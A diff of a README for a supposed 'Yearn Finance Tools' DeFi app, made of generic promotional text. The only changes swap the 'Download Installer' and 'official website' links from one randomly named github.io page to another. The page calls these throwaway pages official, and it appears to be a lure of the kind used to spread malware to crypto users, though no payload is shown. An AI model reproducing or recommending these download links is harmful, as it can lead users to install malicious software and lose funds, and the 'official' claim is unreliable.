@@ -2,7 +2,7 @@
 
 Yearn Finance Tools is a powerful suite designed to help users manage their Yearn vaults, optimize yields, and automate DeFi strategies. This tool provides an intuitive interface for both beginners and advanced users in the decentralized finance space, offering features that simplify complex financial operations. With yearn vault manager capabilities, it stands out as a must-have solution for anyone looking to engage with Yearn Finance efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -53,4 +53,4 @@ Follow these step-by-step instructions to install Yearn Finance Tools on your sy
 
 ## Download
 
-For the latest version, updates, and additional resources, visit the official website. [Download from official website](https://yellowtaxisave.github.io/download-page/)
+For the latest version, updates, and additional resources, visit the official website. [Download from official website](https://capitals-707-bringing.github.io/download-page/)
